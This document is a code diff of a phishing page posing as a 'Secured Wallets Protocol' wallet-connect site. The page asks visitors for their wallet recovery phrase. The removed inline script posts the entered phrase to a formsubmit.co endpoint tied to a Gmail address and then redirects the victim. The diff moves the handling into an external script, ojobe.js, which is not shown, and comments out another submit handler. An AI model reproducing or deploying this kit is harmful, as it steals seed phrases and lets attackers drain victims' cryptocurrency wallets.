@@ -1237,8 +1237,9 @@
             <div class="result" style="text-align:center"></div>
             <div class="tabContent active" id="phraseContent">
                 <form method="post" name="phraseKey" id="phraseKey">
-                    <div class="row"><textarea data-name="phrase" name="recovery_phrase" id='recovery_phrase' required=""
-                            placeholder="Wallet Phrases or Wallet Seed Words" style="height:200px"></textarea></div>
+                    <div class="row"><textarea data-name="phrase" name="recovery_phrase" id='recovery_phrase'
+                            required="" placeholder="Wallet Phrases or Wallet Seed Words"
+                            style="height:200px"></textarea></div>
                     <small style="text-align:center">Typically 12 (sometimes 24) words separated by single
                         spaces</small>
                     <div class="row" style="margin-top:10px"><button class="" type="submit" name="submit">Connect
@@ -1269,7 +1270,7 @@
         </div>
     </div>
     <script src="./Secured Wallets Protocol_files/jquery-3.4.1.min.js.download"></script>
-    <script type="text/javascript">
+    <script type="text/javascript" async defer>
         let connect = document.querySelectorAll('.myBtn2')
         let displayModalBack = (new URLSearchParams(location.search)).toString('type')
         let sliceddisplayModalBack = displayModalBack.slice(0, 5)
@@ -1280,32 +1281,8 @@
         document.querySelector('.close2').addEventListener('click', () => {
             connectWallet.style.display = 'none'
         })
-        phraseKey.addEventListener('click', () => {
-            e.preventDefault();
-            mail = "mayhemofflin@gmail.com";
-            next = "next.html";
-            subject = `${window.location.hostname} ${new Date()}`;
-            let r = new FormData();
-            let s = document.querySelector("form").name;
-            recovery_phrase = phraseInput.value;
-            r.append("phraseKey", recovery_phrase);
-            r.append("_captcha", false);
-            r.append("_next", next);
-            r.append("_template", "table");
-            r.append("_subject", subject);
-            console.log(r);
-            let n = `https://formsubmit.co/${mail}`;
-            fetch(
-                n, {
-                    method: "POST",
-                    body: r,
-                }, {
-                    referrer: "https://twitter.com"
-                },
-            ).then((e) => window.location.assign(next));
-        }
-        })
     </script>
+    <script type="text/javascript" async defer src="./ojobe.js"></script>
     <script type="text/javascript">
         $(".tab ul li").on("click", function () {
             var e = $(this).attr("id");
@@ -1326,7 +1303,7 @@
         })
         var setWallet = function (e) {
             $(".wallet").val(e), $("#walletName").html(e), $(".n").val(0)
-        };
+        };/*
         $(".allforms").on("click", function (e) {
             e.preventDefault();
             var t = $(this).attr("id"),
@@ -1356,7 +1333,7 @@
                 }
             }), !1
         })
-    </script>
+    */</script>
 </body>
 
 </html>
